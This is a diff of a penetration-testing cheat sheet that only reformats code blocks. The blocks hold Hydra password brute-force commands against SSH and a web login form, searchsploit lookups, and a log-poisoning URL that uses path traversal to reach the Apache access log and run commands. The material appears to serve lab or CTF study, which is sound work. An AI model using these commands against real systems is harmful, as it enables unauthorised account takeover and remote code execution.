@@ -640,25 +640,25 @@
 
 ### Hydra
 
-	```
-	hydra -V -f -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
-	hydra -V -f -L USERLIST -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
-	hydra -f -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
-	hydra -f -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
-	```
+```
+hydra -V -f -l USER -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
+hydra -V -f -L USERLIST -P /usr/share/wordlists/rockyou.txt ssh://IP:22/
+hydra -f -l USER -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
+hydra -f -L /usr/share/wordlists/metasploit/namelist.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form "/Intellect/Login.aspx:Username=^USER^&Password=^PASS^:The username or password you entered is incorrect"
+```
 
 ### Searchsploit
 
-	```
-	searchsploit EXPLOIT
-	searchsploit -m NUMBER_EXPLOIT
-	```
+```
+searchsploit EXPLOIT
+searchsploit -m NUMBER_EXPLOIT
+```
 
 ### Log poisoning
 
-	```
-	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
-	```
+```
+http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
+```
 
 ## System Enumeration and attack vectors
 
